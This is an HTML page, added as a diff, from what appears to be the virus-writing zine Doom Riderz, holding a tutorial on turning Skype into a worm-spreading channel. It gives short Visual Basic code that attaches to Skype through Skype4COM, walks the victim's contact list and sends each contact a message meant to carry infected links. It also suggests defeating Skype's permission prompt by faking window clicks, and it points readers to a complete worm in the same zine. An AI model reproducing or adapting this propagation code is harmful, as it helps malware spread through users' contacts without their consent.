@@ -1,0 +1,111 @@
+<html>
+<head>
+<title>Doom Riderz - Evilution Issue 1</title>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+<link rel="stylesheet" type="text/css" href="../doom.css">
+<script type="text/javascript" src="../fader.js"></script>
+</head>
+<body bgcolor="#000000" leftmargin="0" topmargin="0" marginwidth="0" marginheight="0">
+<br>
+<div id="viewerText">
+<div id="viewerTextHeader"><a href="#">Using Skype for VX by wargame</a></div>
+<pre>
+
+               +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+               ++++        Using Skype for VX by [WarGame/doomriderz]         ++++
+               +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+
+
+
+
+
+
+
+1) Introduction
+2) Code
+3) Greetz
+
+
+
+
+
+
+1) Introduction
+
+    This is my first tutorial for the doomriderz, I will try to explain it in the better
+    way :).
+    But remember my first language is not english but italian :).
+    Skype is a very popular VoIP client, you can talk with all the world with few money and
+    in every moment ( you need only a PC + skype ).
+    This tutorial will explain you how to use the classical IM component of this program.
+    The challenge is to create a full working VoIP worm :)
+
+
+
+
+
+
+2) Code
+
+    There are 2 main ways to access to skype:
+    a) Direct API
+    2) Skype4COM interface
+    The option "a" is not so simple, I used it in my first C worm released in EOF#1 and I took
+    much time to implement it.
+    If you are interested look at the zine: http://vx.netlux.org/vx.php?id=ze02
+    The option "b" is the better than "a": it is very simple and you can use skype with few
+    lines of code.
+    Ok no other words, go to code :)
+    This is a vb code snippet that shows all:
+
+    1 - Set skype_fd = CreateObject("Skype4COM.Skype")
+    2 - skype_fd.Client.Start
+    3 - skype_fd.Attach
+
+    Line 1: instance a Skype4COM object (in theory you could do this in every language that can access COM, asm too :) )
+    Line 2: boot up skype
+    Line 3: attach to skype client
+
+    Ok now we are connected to skype, ah I was forgetting, skype will prompt user to allow proggy
+    to access skype ... an exercise for the reader, bypass skype warning (FindWindow() & SendMessage() should be enough).
+    The next step is to read contact list and send IM messages (containing infected URLs):
+
+    Line 4: For Each user In skype_fd.Friends
+    Line 5: skype_fd.SendMessage user.Handle, "your message here"
+    Line 6: Next
+
+    Line 4: this for loop is to iterate in contact list ( current buddy in user var )
+    Line 5: Use the SendMessage() method to send the IM message
+    Line 6: the end of the loop :)
+
+    It's amazing, with those few lines of code you can use skype for your own aim.
+    I used vb for an example worm (M$ products can destroy your brain!) but every other language
+    could be used like js, or some .net languages.
+    For a nasty example of all this shit, look at my utopia vb worm in this zine
+
+
+
+
+
+
+3) Greetz (in random order)
+
+    A great thx go to all doomriderz team: 
+    genetix: for the fun on MsN and on IrC and your amazing code (I learn much from you)
+    free0n:  for being a very friendly guy and a pioneer of .NET :)
+    Michael: thx for your suggestions about my VCK :).
+    The same for the other members of doomriderz.
+    Other people I would like to thank:
+    SlageHammer: you are my vx-father :)
+    izee:        you are the right leader for EOF, go on so :) !
+    Nibble:      a great rude friend :)
+    retr0:       Sex pistols rulez !
+    
+    You can contact me at: wargame89@yahoo.it, my home site: http://ihateyou.altervista.org or
+    our main site: http://doomriderz.co.nr
+
+</pre>
+</div>
+</body>
+</html>
